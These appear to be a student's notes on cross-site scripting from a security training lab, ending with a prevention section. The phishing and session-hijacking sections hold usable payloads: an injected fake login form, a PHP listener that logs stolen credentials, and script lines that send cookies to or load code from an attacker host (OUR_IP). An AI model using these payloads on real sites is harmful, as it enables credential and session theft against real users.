
## Persistent

Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used

some browsers will filter alert() we can test in other ways:
- `<plaintext>` - not html will render after this tag
- `<script>print()</script>` - 

## Reflected

processed by the server and returns to frontend without being filtered or sanitized
if a get request is used for the payload we can send the script through the url to perform reflected attacks.

`http://94.237.56.76:43679/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E`

## DOM

completely proccess on client side

works through a source and sink model

source is where the xss is entered, like a input field or url param
sink is the function the writes to the document:
- document.write()
- DOM.innerHTML
- DOM.outerHTML
- add()
- after()
- append()

if these functions do incorporate sanitization or filtering, then we know there is an xss vulnerability

innerHTML doesnt accept script tags

`<img src="" onerror=alert(window.origin)>` - payload example for dom xss

dom based xss can also be performed through the url parameters if it is using local linking through the \#param

## Discovery

Automated using nessus, burp pro or zap

open source tools:
- XSS strike
- Brute XSS
- XSSer

## Payloads for manual testing

XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

https://github.com/payloadbox/xss-payload-list

## Defacing

`<script>document.body.style.background = "#141d2b"</script>`

`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`

`<script>document.title = 'HackTheBox Academy'</script>`

`document.getElementById("todo").innerHTML = "New Text"`

`$("#todo").html('New Text');`

`document.getElementsByTagName('body')[0].innerHTML = "New Text"`

`<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script`

## XSS Phishing

this can be done through stored and reflective methods through url params etc

`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');` - injects a form through a found xss vulnerability

remove other elements from the page to convice people they need to log in to use the site
`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();

add comment at the end to remove additional html if needed `<!--`

netcat listener is good enough but it wont function correctly for the end user (they will get unable to connect error) and they may get suspicious, so we use a php listener instead to get the page to function like a normal login form

php listener

mkdir /tmp/tmpserver
cd /tmp/tmpserver
create index.php
sudo php -S 0.0.0.0:80

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>

## Session Hijacking

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

make use of script.js and host it in a webserver to enable script tags to pull your script remotely to easily execute code and steal cookies

new Image().src='http://OUR_IP/index.php?c='+document.cookie - serve this inside of script tags through script.js

<script src=http://ip/script.js></script>

payloads

<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>


## Prevention

sanitize and filtering on front end and backend

https://github.com/cure53/DOMPurify - library for escaping characters

 we should always ensure that we never use user input directly within certain HTML tags, like:

1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

 we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

And the following jQuery functions:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

sanitize in the backend with libraries and functions:

- addslashes()
- htlmentitites() or htmlspecialchars()- output html encoding

In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

In addition to the above, having a good `Web Application Firewall (WAF)` can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like [ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0).